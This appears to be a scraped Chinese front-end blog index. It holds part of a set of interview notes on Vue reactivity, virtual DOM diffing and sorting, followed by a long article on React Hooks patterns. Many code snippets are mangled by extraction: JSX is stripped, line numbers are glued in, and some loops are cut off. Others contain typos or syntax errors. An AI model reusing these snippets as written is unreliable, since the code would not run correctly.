})}// 依赖收集器class Dep { constructor() { this.subs = [] } addSub(sub) { this.subs.push(sub) } notify() { this.subs.map(sub => { sub.update() }) }}Dep.target = null// 观察者class Watcher { constructor(obj, key, cb) { Dep.target = this this.cb = cb this.obj = obj this.key = key this.value = obj[key] Dep.target = null } addDep(Dep) { Dep.addSub(this) } update() { this.value = this.obj[this.key] this.cb(this.value) } before() { callHook('beforeUpdate') }} 4. virtual dom 原理实现 创建 dom 树 树的diff，同层对比，输出patchs(listDiff/diffChildren/diffProps) 没有新的节点，返回 新的节点tagName与key不变， 对比props，继续递归遍历子树 对比属性(对比新旧属性列表): 旧属性是否存在与新属性列表中 都存在的是否有变化 是否出现旧列表中没有的新属性 tagName和key值变化了，则直接替换成新节点 渲染差异 遍历patchs， 把需要更改的节点取出来 局部更新dom 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126// diff算法的实现function diff(oldTree, newTree) { // 差异收集 let pathchs = {} dfs(oldTree, newTree, 0, pathchs) return pathchs}function dfs(oldNode, newNode, index, pathchs) { let curPathchs = [] if (newNode) { // 当新旧节点的 tagName 和 key 值完全一致时 if (oldNode.tagName === newNode.tagName && oldNode.key === newNode.key) { // 继续比对属性差异 let props = diffProps(oldNode.props, newNode.props) curPathchs.push({ type: 'changeProps', props }) // 递归进入下一层级的比较 diffChildrens(oldNode.children, newNode.children, index, pathchs) } else { // 当 tagName 或者 key 修改了后，表示已经是全新节点，无需再比 curPathchs.push({ type: 'replaceNode', node: newNode }) } } // 构建出整颗差异树 if (curPathchs.length) { if(pathchs[index]){ pathchs[index] = pathchs[index].concat(curPathchs) } else { pathchs[index] = curPathchs } }}// 属性对比实现function diffProps(oldProps, newProps) { let propsPathchs = [] // 遍历新旧属性列表 // 查找删除项 // 查找修改项 // 查找新增项 forin(olaProps, (k, v) => { if (!newProps.hasOwnProperty(k)) { propsPathchs.push({ type: 'remove', prop: k }) } else { if (v !== newProps[k]) { propsPathchs.push({ type: 'change', prop: k , value: newProps[k] }) } } }) forin(newProps, (k, v) => { if (!oldProps.hasOwnProperty(k)) { propsPathchs.push({ type: 'add', prop: k, value: v }) } }) return propsPathchs}// 对比子级差异function diffChildrens(oldChild, newChild, index, pathchs) { // 标记子级的删除/新增/移动 let { change, list } = diffList(oldChild, newChild, index, pathchs) if (change.length) { if (pathchs[index]) { pathchs[index] = pathchs[index].concat(change) } else { pathchs[index] = change } } // 根据 key 获取原本匹配的节点，进一步递归从头开始对比 oldChild.map((item, i) => { let keyIndex = list.indexOf(item.key) if (keyIndex) { let node = newChild[keyIndex] // 进一步递归对比 dfs(item, node, index, pathchs) } })}// 列表对比，主要也是根据 key 值查找匹配项// 对比出新旧列表的新增/删除/移动function diffList(oldList, newList, index, pathchs) { let change = [] let list = [] const newKeys = getKey(newList) oldList.map(v => { if (newKeys.indexOf(v.key) > -1) { list.push(v.key) } else { list.push(null) } }) // 标记删除 for (let i = list.length - 1; i>= 0; i--) { if (!list[i]) { list.splice(i, 1) change.push({ type: 'remove', index: i }) } } // 标记新增和移动 newList.map((item, i) => { const key = item.key const index = list.indexOf(key) if (index === -1 || key == null) { // 新增 change.push({ type: 'add', node: item, index: i }) list.splice(i, 0, key) } else { // 移动 if (index !== i) { change.push({ type: 'move', form: index, to: i, }) move(list, index, i) } } }) return { change, list }} 5. Proxy 相比于 defineProperty 的优势 数组变化也能监听到 不需要深度遍历监听 1234567let data = { a: 1 }let reactiveData = new Proxy(data, { get: function(target, name){ // ... }, // ...}) 6. vue-router mode hash history 跳转 this.$router.push() 占位 7. vuex state: 状态中心 mutations: 更改状态 actions: 异步更改状态 getters: 获取状态 modules: 将state分成多个modules，便于管理 算法其实算法方面在前端的实际项目中涉及得并不多，但还是需要精通一些基础性的算法，一些公司还是会有这方面的需求和考核，建议大家还是需要稍微准备下，这属于加分题。 1. 五大算法 贪心算法: 局部最优解法 分治算法: 分成多个小模块，与原问题性质相同 动态规划: 每个状态都是过去历史的一个总结 回溯法: 发现原先选择不优时，退回重新选择 分支限界法 2. 基础排序算法 冒泡排序: 两两比较 1234567891011function bubleSort(arr) { var len = arr.length; for (let outer = len ; outer >= 2; outer--) { for(let inner = 0; inner arr[inner + 1]) { [arr[inner],arr[inner+1]] = [arr[inner+1],arr[inner]] } } } return arr;} 选择排序: 遍历自身以后的元素，最小的元素跟自己调换位置 1234567891011function selectSort(arr) { var len = arr.length; for(let i = 0 ;i < len - 1; i++) { for(let j = i ; j","link":"/posts/3675bc6d/"},{"title":"一篇看懂 React Hooks","text":"什么是 React HooksReact Hooks 是 React 16.7.0-alpha 版本推出的新特性，想尝试的同学安装此版本即可。 __React Hooks 要解决的问题是状态共享__，是继 render-props 和 higher-order components 之后的第三种状态共享方案，不会产生 JSX 嵌套地狱问题。 这个状态指的是状态逻辑，所以称为__状态逻辑复用__会更恰当，因为只共享数据处理逻辑，不会共享数据本身。 不久前精读分享过的一篇 Epitath 源码 - renderProps 新用法 就是解决 JSX 嵌套问题，有了 React Hooks 之后，这个问题就被官方正式解决了。为了更快理解 React Hooks 是什么，先看笔者引用的下面一段 renderProps 代码： 12345678910function App() { return ( {({ on, toggle }) => ( Open Modal )} )} 恰巧，React Hooks 解决的也是这个问题： 123456789101112131415function App() { const [open, setOpen] = useState(false); return ( setOpen(true)}> Open Modal setOpen(false)} onCancel={() => setOpen(false)} /> );} 可以看到，React Hooks 就像一个内置的打平 renderProps 库，我们可以随时创建一个值，与修改这个值的方法。看上去像 function 形式的 setState，其实这等价于依赖注入，与使用 setState 相比，__这个组件是没有状态的__。 React Hooks 的特点React Hooks 带来的好处不仅是 “更 FP，更新粒度更细，代码更清晰”，还有如下三个特性： 多个状态不会产生嵌套，写法还是平铺的（renderProps 可以通过 compose 解决，可不但使用略为繁琐，而且因为强制封装一个新对象而增加了实体数量）。 Hooks 可以引用其他 Hooks。 更容易将组件的 UI 与状态分离。 第二点展开说一下：Hooks 可以引用其他 Hooks，我们可以这么做： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import { useState, useEffect } from \"react\";// 底层 Hooks, 返回布尔值：是否在线function useFriendStatusBoolean(friendID) { const [isOnline, setIsOnline] = useState(null); function handleStatusChange(status) { setIsOnline(status.isOnline); } useEffect(() => { ChatAPI.subscribeToFriendStatus(friendID, handleStatusChange); return () => { ChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange); }; }); return isOnline;}// 上层 Hooks，根据在线状态返回字符串：Loading... or Online or Offlinefunction useFriendStatusString(props) { const isOnline = useFriendStatusBoolean(props.friend.id); if (isOnline === null) { return \"Loading...\"; } return isOnline ? \"Online\" : \"Offline\";}// 使用了底层 Hooks 的 UIfunction FriendListItem(props) { const isOnline = useFriendStatusBoolean(props.friend.id); return ( {props.friend.name} );}// 使用了上层 Hooks 的 UIfunction FriendListStatus(props) { const statu = useFriendStatusString(props.friend.id); return {statu};} 这个例子中，有两个 Hooks：useFriendStatusBoolean 与 useFriendStatusString, useFriendStatusString是利用 useFriendStatusBoolean 生成的新 Hook，这两个 Hook 可以给不同的 UI：FriendListItem、FriendListStatus 使用，而因为两个 Hooks 数据是联动的，因此两个 UI 的状态也是联动的。 顺带一提，这个例子也可以用来理解 对 React Hooks 的一些思考 一文的那句话：__“有状态的组件没有渲染，有渲染的组件没有状态”__： useFriendStatusBoolean 与 useFriendStatusString 是有状态的组件（使用 useState），没有渲染（返回非 UI 的值），这样就可以作为 Custom Hooks 被任何 UI 组件调用。 FriendListItem 与 FriendListStatus 是有渲染的组件（返回了 JSX），没有状态（没有使用 useState），这就是一个纯函数 UI 组件， 利用 useState 创建 ReduxRedux 的精髓就是 Reducer，而利用 React Hooks 可以轻松创建一个 Redux 机制： 1234567891011// 这就是 Reduxfunction useReducer(reducer, initialState) { const [state, setState] = useState(initialState); function dispatch(action) { const nextState = reducer(state, action); setState(nextState); } return [state, dispatch];} 这个自定义 Hook 的 value 部分当作 redux 的 state，setValue 部分当作 redux 的 dispatch，合起来就是一个 redux。而 react-redux 的 connect 部分做的事情与 Hook 调用一样： 1234567891011121314151617181920212223// 一个 Actionfunction useTodos() { const [todos, dispatch] = useReducer(todosReducer, []); function handleAddClick(text) { dispatch({ type: \"add\", text }); } return [todos, { handleAddClick }];}// 绑定 Todos 的 UIfunction TodosUI() { const [todos, actions] = useTodos(); return ( {todos.map((todo, index) => ( {todo.text} ))} Add Todo );} useReducer 已经作为一个内置 Hooks 了，在这里可以查阅所有 内置 Hooks。 不过这里需要注意的是，每次 useReducer 或者自己的 Custom Hooks 都不会持久化数据，所以比如我们创建两个 App，App1 与 App2: 1234567891011121314151617181920function App1() { const [todos, actions] = useTodos(); return todo count: {todos.length};}function App2() { const [todos, actions] = useTodos(); return todo count: {todos.length};}function All() { return ( );} 这两个实例同时渲染时，并不是共享一个 todos 列表，而是分别存在两个独立 todos 列表。也就是 React Hooks 只提供状态处理方法，不会持久化状态。 如果要真正实现一个 Redux 功能，也就是全局维持一个状态，任何组件 useReducer 都会访问到同一份数据，可以和 useContext 一起使用。 大体思路是利用 useContext 共享一份数据，作为 Custom Hooks 的数据源。具体实现可以参考 redux-react-hook。 利用 useEffect 代替一些生命周期在 useState 位置附近，可以使用 useEffect 处理副作用： 1234567useEffect(() => { const subscription = props.source.subscribe(); return () => { // Clean up the subscription subscription.unsubscribe(); };}); useEffect 的代码既会在初始化时候执行，也会在后续每次 rerender 时执行，而返回值在析构时执行。这个更多带来的是便利，对比一下 React 版 G2 调用流程： 1234567891011121314151617181920212223242526272829303132class Component extends React.PureComponent { private chart: G2.Chart = null; private rootDomRef: React.ReactInstance = null; componentDidMount() { this.rootDom = ReactDOM.findDOMNode(this.rootDomRef) as HTMLDivElement; this.chart = new G2.Chart({ container: document.getElementById(\"chart\"), forceFit: true, height: 300 }); this.freshChart(this.props); } componentWillReceiveProps(nextProps: Props) { this.freshChart(nextProps); } componentWillUnmount() { this.chart.destroy(); } freshChart(props: Props) { // do something this.chart.render(); } render() { return (this.rootDomRef = ref)} />; }} 用 React Hooks 可以这么做： 123456789101112131415161718192021function App() { const ref = React.useRef(null); let chart: G2.Chart = null; React.useEffect(() => { if (!chart) { chart = new G2.Chart({ container: ReactDOM.findDOMNode(ref.current) as HTMLDivElement, width: 500, height: 500 }); } // do something chart.render(); return () => chart.destroy(); }); return ;} 可以看到将细碎的代码片段结合成了一个完整的代码块，更维护。 现在介绍了 useState useContext useEffect useRef 等常用 hooks，更多可以查阅：内置 Hooks，相信不久的未来，这些 API 又会成为一套新的前端规范。 React Hooks 将带来什么变化Hooks 带来的约定Hook 函数必须以 “use” 命名开头，因为这样才方便 eslint 做检查，防止用 condition 判断包裹 useHook 语句。 为什么不能用 condition 包裹 useHook 语句，详情可以见 官方文档，这里简单介绍一下。 React Hooks 并不是通过 Proxy 或者 getters 实现的（具体可以看这篇文章 React hooks: not magic, just arrays），而是通过数组实现的，每次 useState 都会改变下标，如果 useState 被包裹在 condition 中，那每次执行的下标就可能对不上，导致 useState 导出的 setter 更新错数据。 虽然有 eslint-plugin-react-hooks 插件保驾护航，但这第一次将 “约定优先” 理念引入了 React 框架中，带来了前所未有的__代码命名和顺序限制__（函数命名遭到官方限制，JS 自由主义者也许会暴跳如雷），但带来的便利也是前所未有的（没有比 React Hooks 更好的状态共享方案了，约定带来提效，自由的代价就是回到 renderProps or HOC，各团队可以自行评估）。 笔者认为，React Hooks 的诞生，也许来自于这个灵感：“不如通过增加一些约定，彻底解决状态共享问题吧！” React 约定大于配置脚手架 nextjs umi 以及笔者的 pri 都通过有 “约定路由” 的功能，大大降低了路由配置复杂度，__那么 React Hooks 就像代码级别的约定__，大大降低了代码复杂度。 状态与 UI 的界限会越来越清晰因为 React Hooks 的特性，如果一个 Hook 不产生 UI，那么它可以永远被其他 Hook 封装，虽然允许有副作用，但是被包裹在 useEffect 里，总体来说还是挺函数式的。而 Hooks 要集中在 UI 函数顶部写，也很容易养成书写无状态 UI 组件的好习惯，践行 “状态与 UI 分开” 这个理念会更容易。 不过这个理念稍微有点蹩脚的地方，那就是 “状态” 到底是什么。 1234function App() { const [count, setCount] = useCount(); return {count};} 我们知道 useCount 算是无状态的，因为 React Hooks 本质就是 renderProps 或者 HOC 的另一种写法，换成 renderProps 就好理解了： 12345{(count, setCount) => };function App(props) { return {props.count};} 可以看到 App 组件是无状态的，输出完全由输入（Props）决定。 那么有状态无 UI 的组件就是 useCount 了： 1234function useCount() { const [count, setCount] = useState(0); return [count, setCount];} 有状态的地方应该指 useState(0) 这句，不过这句和无状态 UI 组件 App 的 useCount() 很像，既然 React 把 useCount 成为自定义 Hook，那么 useState 就是官方 Hook，具有一样的定义，因此可以认为 useCount 是无状态的，useState 也是一层 renderProps，最终的状态其实是 useState 这个 React 内置的组件。 我们看 renderProps 嵌套的表达： 123456789 {(count, setCount) => ( {\" \"} {/**虽然是透传，但给 count 做了去重，不可谓没有作用 */} {(count, setCount) => } )} 能确定的是，App 一定有 UI，而上面两层父级组件一定没有 UI。为了最佳实践，我们尽量避免 App 自己维护状态，而其父级的 RenderProps 组件可以维护状态（也可以不维护状态，做个二传手）。因此可以考虑在 “有状态的组件没有渲染，有渲染的组件没有状态” 这句话后面加一句：没渲染的组件也可以没状态。 React Hooks 实践通过上面的理解，你已经对 React Hooks 有了基本理解，也许你也看了 React Hooks 基本实现剖析（就是数组），但理解实现原理就可以用好了吗？学的是知识，而用的是技能，看别人的用法就像刷抖音一样（哇，饭还可以这样吃？），你总会有新的收获。 首先，站在使用角度，要理解 React Hooks 的特点是 “非常方便的 Connect 一切”，所以无论是数据流、Network，或者是定时器都可以监听，有一点 RXJS 的意味，也就是你可以利用 React Hooks，将 React 组件打造成：任何事物的变化都是输入源，当这些源变化时会重新触发 React 组件的 render，你只需要挑选组件绑定哪些数据源（use 哪些 Hooks），然后只管写 render 函数就行了！ DOM 副作用修改 / 监听做一个网页，总有一些看上去和组件关系不大的麻烦事，比如修改页面标题（切换页面记得改成默认标题）、监听页面大小变化（组件销毁记得取消监听）、断网时提示（一层层装饰器要堆成小山了）。而 React Hooks 特别擅长做这些事，造这种轮子，大小皆宜。 由于 React Hooks 降低了高阶组件使用成本，那么一套生命周期才能完成的 “杂耍” 将变得非常简单。下面举几个例子： 修改页面 title效果：在组件里调用 useDocumentTitle 函数即可设置页面标题，且切换页面时，页面标题重置为默认标题 “前端精读”。 1useDocumentTitle(\"个人中心\"); 实现：直接用 document.title 赋值，不能再简单。在销毁时再次给一个默认标题即可，这个简单的函数可以抽象在项目工具函数里，每个页面组件都需要调用。 123456789function useDocumentTitle(title) { useEffect( () => { document.title = title; return () => (document.title = \"前端精读\"); }, [title] );} 在线 Demo 监听页面大小变化，网络是否断开效果：在组件调用 useWindowSize 时，可以拿到页面大小，并且在浏览器缩放时自动触发组件更新。 12const windowSize = useWindowSize();return 页面高度：{windowSize.innerWidth}; 实现：和标题思路基本一致，这次从 window.innerHeight 等 API 直接拿到页面宽高即可，注意此时可以用 window.addEventListener('resize') 监听页面大小变化，此时调用 setValue 将会触发调用自身的 UI 组件 rerender，就是这么简单！ 最后注意在销毁时，removeEventListener 注销监听。 12345678910111213141516171819202122232425function getSize() { return { innerHeight: window.innerHeight, innerWidth: window.innerWidth, outerHeight: window.outerHeight, outerWidth: window.outerWidth };}function useWindowSize() { let [windowSize, setWindowSize] = useState(getSize()); function handleResize() { setWindowSize(getSize()); } useEffect(() => { window.addEventListener(\"resize\", handleResize); return () => { window.removeEventListener(\"resize\", handleResize); }; }, []); return windowSize;} 在线 Demo 动态注入 css效果：在页面注入一段 class，并且当组件销毁时，移除这个 class。 12345const className = useCss({ color: \"red\"});return Text.; 实现：可以看到，Hooks 方便的地方是在组件销毁时移除副作用，所以我们可以安心的利用 Hooks 做一些副作用。注入 css 自然不必说了，而销毁 css 只要找到注入的那段引用进行销毁即可，具体可以看这个 代码片段。 DOM 副作用修改 / 监听场景有一些现成的库了，从名字上就能看出来用法：document-visibility、network-status、online-status、window-scroll-position、window-size、document-title。 组件辅助Hooks 还可以增强组件能力，比如拿到并监听组件运行时宽高等。 获取组件宽高效果：通过调用 useComponentSize 拿到某个组件 ref 实例的宽高，并且在宽高变化时，rerender 并拿到最新的宽高。 123456789const ref = useRef(null);let componentSize = useComponentSize(ref);return ( {componentSize.width} ); 实现：和 DOM 监听类似，这次换成了利用 ResizeObserver 对组件 ref 进行监听，同时在组件销毁时，销毁监听。 其本质还是监听一些副作用，但通过 ref 的传递，我们可以对组件粒度进行监听和操作了。 1234567891011useLayoutEffect(() => { handleResize(); let resizeObserver = new ResizeObserver(() => handleResize()); resizeObserver.observe(ref.current); return () => { resizeObserver.disconnect(ref.current); resizeObserver = null; };}, []); 在线 Demo，对应组件 component-size。 拿到组件 onChange 抛出的值效果：通过 useInputValue() 拿到 Input 框当前用户输入的值，而不是手动监听 onChange 再腾一个 otherInputValue 和一个回调函数把这一堆逻辑写在无关的地方。 123let name = useInputValue(\"Jamie\");// name = { value: 'Jamie', onChange: [Function] }return ; 可以看到，这样不仅没有占用组件自己的 state，也不需要手写 onChange 回调函数进行处理，这些处理都压缩成了一行 use hook。 实现：读到这里应该大致可以猜到了，利用 useState 存储组件的值，并抛出 value 与 onChange，监听 onChange 并通过 setValue 修改 value, 就可以在每次 onChange 时触发调用组件的 rerender 了。 1234567891011function useInputValue(initialValue) { let [value, setValue] = useState(initialValue); let onChange = useCallback(function(event) { setValue(event.currentTarget.value); }, []); return { value, onChange };} 这里要注意的是，我们对组件增强时，__组件的回调一般不需要销毁监听，而且仅需监听一次，这与 DOM 监听不同__，因此大部分场景，我们需要利用 useCallback 包裹，并传一个空数组，来保证永远只监听一次，而且不需要在组件销毁时注销这个 callback。 在线 Demo，对应组件 input-value。 做动画利用 React Hooks 做动画，一般是拿到一些具有弹性变化的值，我们可以将值赋给进度条之类的组件，这样其进度变化就符合某种动画曲线。 在某个时间段内获取 0-1 之间的值这个是动画最基本的概念，某个时间内拿到一个线性增长的值。 效果：通过 useRaf(t) 拿到 t 毫秒内不断刷新的 0-1 之间的数字，期间组件会不断刷新，但刷新频率由 requestAnimationFrame 控制（不会卡顿 UI）。 1const value = useRaf(1000); 实现：写起来比较冗长，这里简单描述一下。利用 requestAnimationFrame 在给定时间内给出 0-1 之间的值，那每次刷新时，只要判断当前刷新的时间点占总时间的比例是多少，然后做分母，分子是 1 即可。 在线 Demo，对应组件 use-raf。 弹性动画效果：通过 useSpring 拿到动画值，组件以固定频率刷新，而这个动画值以弹性函数进行增减。 实际调用方式一般是，先通过 useState 拿到一个值，再通过动画函数包住这个值，这样组件就会从原本的刷新一次，变成刷新 N 次，拿到的值也随着动画函数的规则变化，最后这个值会稳定到最终的输入值（如例子中的 50）。 1234const [target, setTarget] = useState(50);const value = useSpring(target);return setTarget(100)}>{value}; 实现：为了实现动画效果，需要依赖 rebound 库，它可以实现将一个目标值拆解为符合弹性动画函数过程的功能，那我们需要利用 React Hooks 做的就是在第一次接收到目标值是，调用 spring.setEndValue 来触发动画事件，并在 useEffect 里做一次性监听，再值变时重新 setValue 即可。 最神奇的 setTarget 联动 useSpring 重新计算弹性动画部分，是通过 useEffect 第二个参数实现的： 12345678useEffect( () => { if (spring) { spring.setEndValue(targetValue); } }, [targetValue]); 也就是当目标值变化后，才会进行新的一轮 rerender，所以 useSpring 并不需要监听调用处的 setTarget，它只需要监听 target 的变化即可，而巧妙利用 useEffect 的第二个参数可以事半功倍。 在线 Demo Tween 动画明白了弹性动画原理，Tween 动画就更简单了。 效果：通过 useTween 拿到一个从 0 变化到 1 的值，这个值的动画曲线是 tween。可以看到，由于取值范围是固定的，所以我们不需要给初始值了。 1const value = useTween(); 实现：通过 useRaf 拿到一个线性增长的值（区间也是 0 ～ 1），再通过 easing 库将其映射到 0 ～ 1 到值即可。这里用到了 hook 调用 hook 的联动（通过 useRaf 驱动 useTween），还可以在其他地方举一反三。 1234const fn: Easing = easing[easingName];const t = useRaf(ms, delay);return fn(t); 发请求利用 Hooks，可以将任意请求 Promise 封装为带有标准状态的对象：loading、error、result。 通用 Http 封装效果：通过 useAsync 将一个 Promise 拆解为 loading、error、result 三个对象。 1const { loading, error, result } = useAsync(fetchUser, [id]); 实现：在 Promise 的初期设置 loading，结束后设置 result，如果出错则设置 error，这里可以将请求对象包装成 useAsyncState 来处理，这里就不放出来了。 123456789101112export function useAsync(asyncFunction) { const asyncState = useAsyncState(options); useEffect(() => { const promise = asyncFunction(); asyncState.setLoading(); promise.then( result => asyncState.setResult(result);, error => asyncState.setError(error); ); }, params);} 具体代码可以参考 react-async-hook，这个功能建议仅了解原理，具体实现因为有一些边界情况需要考虑，比如组件 isMounted 后才能相应请求结果。 Request Service业务层一般会抽象一个 request service 做统一取数的抽象（比如统一 url，或者可以统一换 socket 实现等等）。假如以前比较 low 的做法是： 123456789async componentDidMount() { // setState: 改 isLoading state try { const data = await fetchUser() // setState: 改 isLoading、error、data } catch (error) { // setState: 改 isLoading、error }} 后来把请求放在 redux 里，通过 connect 注入的方式会稍微有些改观： 12345678910@Connect(...)class App extends React.PureComponent { public componentDidMount() { this.props.fetchUser() } public render() { // this.props.userData.isLoading | error | data }} 最后会发现还是 Hooks 简洁明了： 123function App() { const { isLoading, error, data } = useFetchUser();} 而 useFetchUser 利用上面封装的 useAsync 可以很容易编写： 123456789101112const fetchUser = id => fetch(`xxx`).then(result => { if (result.status !== 200) { throw new Error(\"bad status = \" + result.status); } return result.json(); });function useFetchUser(id) { const asyncFetchUser = useAsync(fetchUser, id); return asyncUser;} 填表单React Hooks 特别适合做表单，尤其是 antd form 如果支持 Hooks 版，那用起来会方便许多： 123456789101112131415161718192021222324function App() { const { getFieldDecorator } = useAntdForm(); return ( {getFieldDecorator(\"userName\", { rules: [{ required: true, message: \"Please input your username!\" }] })( )} Log in Or register now! );} 不过虽然如此，getFieldDecorator 还是基于 RenderProps 思路的，彻底的 Hooks 思路是利用之前说的 __组件辅助方式，提供一个组件方法集，用解构方式传给组件__。 Hooks 思维的表单组件效果：通过 useFormState 拿到表单值，并且提供一系列 组件辅助 方法控制组件状态。 1234567const [formState, { text, password }] = useFormState();return ( ); 上面可以通过 formState 随时拿到表单值，和一些校验信息，通过 password(\"pwd\") 传给 input 组件，让这个组件达到受控状态，且输入类型是 password 类型，表单 key 是 pwd。而且可以看到使用的 form 是原生标签，这种表单增强是相当解耦的。 实现：仔细观察一下结构，不难发现，我们只要结合 组件辅助 小节说的 “拿到组件 onChange 抛出的值” 一节的思路，就能轻松理解 text、password 是如何作用于 input 组件，并拿到其输入状态。 往简单的来说，只要把这些状态 Merge 起来，通过 useReducer 聚合到 formState 就可以实现了。 为了简化，我们只考虑对 input 的增强，源码仅需 30 几行： 123456789101112131415161718192021222324252627282930313233343536373839export function useFormState(initialState) { const [state, setState] = useReducer(stateReducer, initialState || {}); const createPropsGetter = type => (name, ownValue) => { const hasOwnValue = !!ownValue; const hasValueInState = state[name] !== undefined; function setInitialValue() { let value = \"\"; setState({ [name]: value }); } const inputProps = { name, // 给 input 添加 type: text or password get value() { if (!hasValueInState) { setInitialValue(); // 给初始化值 } return hasValueInState ? state[name] : \"\"; // 赋值 }, onChange(e) { let { value } = e.target; setState({ [name]: value }); // 修改对应 Key 的值 } }; return inputProps; }; const inputPropsCreators = [\"text\", \"password\"].reduce( (methods, type) => ({ ...methods, [type]: createPropsGetter(type) }), {} ); return [ { values: state }, // formState inputPropsCreators ];} 上面 30 行代码实现了对 input 标签类型的设置，监听 value onChange，最终聚合到大的 values 作为 formState 返回。读到这里应该发现对 React Hooks 的应用都是万变不离其宗的，特别是对组件信息的获取，通过解构方式来做，Hooks 内部再做一下聚合，就完成表单组件基本功能了。 实际上一个完整的轮子还需要考虑 checkbox radio 的兼容，以及校验问题，这些思路大同小异，具体源码可以看 react-use-form-state。 模拟生命周期有的时候 React15 的 API 还是挺有用的，利用 React Hooks 几乎可以模拟出全套。 componentDidMount效果：通过 useMount 拿到 mount 周期才执行的回调函数。 123useMount(() => { // quite similar to `componentDidMount`}); 实现：componentDidMount 等价于 useEffect 的回调（仅执行一次时），因此直接把回调函数抛出来即可。 1useEffect(() => void fn(), []); componentWillUnmount效果：通过 useUnmount 拿到 unmount 周期才执行的回调函数。 123useUnmount(() => { // quite similar to `componentWillUnmount`}); 实现：componentWillUnmount 等价于 useEffect 的回调函数返回值（仅执行一次时），因此直接把回调函数返回值抛出来即可。 1useEffect(() => fn, []); componentDidUpdate效果：通过 useUpdate 拿到 didUpdate 周期才执行的回调函数。 123useUpdate(() => { // quite similar to `componentDidUpdate`}); 实现：componentDidUpdate 等价于 useMount 的逻辑每次执行，除了初始化第一次。因此采用 mouting flag（判断初始状态）+ 不加限制参数确保每次 rerender 都会执行即可。 12345678const mounting = useRef(true);useEffect(() => { if (mounting.current) { mounting.current = false; } else { fn(); }}); Force Update效果：这个最有意思了，我希望拿到一个函数 update，每次调用就强制刷新当前组件。 1const update = useUpdate(); 实现：我们知道 useState 下标为 1 的项是用来更新数据的，而且就算数据没有变化，调用了也会刷新组件，所以我们可以把返回一个没有修改数值的 setValue，这样它的功能就仅剩下刷新组件了。 1const useUpdate = () => useState(0)[1]; 对于 getSnapshotBeforeUpdate, getDerivedStateFromError, componentDidCatch 目前 Hooks 是无法模拟的。 isMounted很久以前 React 是提供过这个 API 的，后来移除了，原因是可以通过 componentWillMount 和 componentWillUnmount 推导。自从有了 React Hooks，支持 isMount 简直是分分钟的事。 效果：通过 useIsMounted 拿到 isMounted 状态。 1const isMounted = useIsMounted(); 实现：看到这里的话，应该已经很熟悉这个套路了，useEffect 第一次调用时赋值为 true，组件销毁时返回 false，注意这里可以加第二个参数为空数组来优化性能。 12345678const [isMount, setIsMount] = useState(false);useEffect(() => { if (!isMount) { setIsMount(true); } return () => setIsMount(false);}, []);return isMount; 在线 Demo 存数据上一篇提到过 React Hooks 内置的 useReducer 可以模拟 Redux 的 reducer 行为，那唯一需要补充的就是将数据持久化。我们考虑最小实现，也就是全局 Store + Provider 部分。 全局 Store效果：通过 createStore 创建一个全局 Store，再通过 StoreProvider 将 store 注入到子组件的 context中，最终通过两个 Hooks 进行获取与操作：useStore 与 useAction： 12345678910111213141516171819const store = createStore({ user: { name: \"小明\", setName: (state, payload) => { state.name = payload; } }});const App = () => ( );function YourApp() { const userName = useStore(state => state.user.name); const setName = userAction(dispatch => dispatch.user.setName);} 实现：这个例子的实现可以单独拎出一篇文章了，所以笔者从存数据的角度剖析一下 StoreProvider 的实现。 对，Hooks 并不解决 Provider 的问题，所以全局状态必须有 Provider，但这个 Provider 可以利用 React 内置的 createContext 简单搞定： 12345const StoreContext = createContext();const StoreProvider = ({ children, store }) => ( {children}); 剩下就是 useStore 怎么取到持久化 Store 的问题了，这里利用 useContext 和刚才创建的 Context 对象： 12const store = useContext(StoreContext);return store; 更多源码可以参考 easy-peasy，这个库基于 redux 编写，提供了一套 Hooks API。 封装原有库是不是 React Hooks 出现后，所有的库都要重写一次？当然不是，我们看看其他库如何做改造。 RenderProps to Hooks这里拿 react-powerplug 举例。 比如有一个 renderProps 库，希望改造成 Hooks 的用法： 123456789101112131415161718import { Toggle } from 'react-powerplug'function App() { return ( {({ on, toggle }) => ( )} )}↓ ↓ ↓ ↓ ↓ ↓import { useToggle } from 'react-powerhooks'function App() { const [on, toggle] = useToggle() return } 效果：假如我是 react-powerplug 的维护者，怎么样最小成本支持 React Hook? 说实话这个没办法一步做到，但可以通过两步实现。 123456789export function Toggle() { // 这是 Toggle 的源码 // balabalabala..}const App = wrap(() => { // 第一步：包 wrap const [on, toggle] = useRenderProps(Toggle); // 第二步：包 useRenderProps}); 实现：首先解释一下为什么要包两层，首先 Hooks 必须遵循 React 的规范，我们必须写一个 useRenderProps 函数以符合 Hooks 的格式，**那问题是如何拿到 Toggle 给 render 的 on 与 toggle？**正常方式应该拿不到，所以退而求其次，将 useRenderProps 拿到的 Toggle 传给 wrap，让 wrap 构造 RenderProps 执行环境拿到 on 与 toggle 后，调用 useRenderProps 内部的 setArgs 函数，让 const [on, toggle] = useRenderProps(Toggle) 实现曲线救国。 1234567891011121314151617const wrappers = []; // 全局存储 wrappersexport const useRenderProps = (WrapperComponent, wrapperProps) => { const [args, setArgs] = useState([]); const ref = useRef({}); if (!ref.current.initialized) { wrappers.push({ WrapperComponent, wrapperProps, setArgs }); } useEffect(() => { ref.current.initialized = true; }, []); return args; // 通过下面 wrap 调用 setArgs 获取值。}; 由于 useRenderProps 会先于 wrap 执行，所以 wrappers 会先拿到 Toggle，wrap 执行时直接调用 wrappers.pop() 即可拿到 Toggle 对象。然后构造出 RenderProps 的执行环境即可： 123456789101112131415export const wrap = FunctionComponent => props => { const element = FunctionComponent(props); const ref = useRef({ wrapper: wrappers.pop() }); // 拿到 useRenderProps 提供的 Toggle const { WrapperComponent, wrapperProps } = ref.current.wrapper; return createElement(WrapperComponent, wrapperProps, (...args) => { // WrapperComponent => Toggle，这一步是在构造 RenderProps 执行环境 if (!ref.current.processed) { ref.current.wrapper.setArgs(args); // 拿到 on、toggle 后，通过 setArgs 传给上面的 args。 ref.current.processed = true; } else { ref.current.processed = false; } return element; });}; 以上实现方案参考 react-hooks-render-props，有需求要可以拿过来直接用，不过实现思路可以参考，作者的脑洞挺大。 Hooks to RenderProps好吧，如果希望 Hooks 支持 RenderProps，那一定是希望同时支持这两套语法。 效果：一套代码同时支持 Hooks 和 RenderProps。 实现：其实 Hooks 封装为 RenderProps 最方便，因此我们使用 Hooks 写核心的代码，假设我们写一个最简单的 Toggle： 1234567const useToggle = initialValue => { const [on, setOn] = useState(initialValue); return { on, toggle: () => setOn(!on) 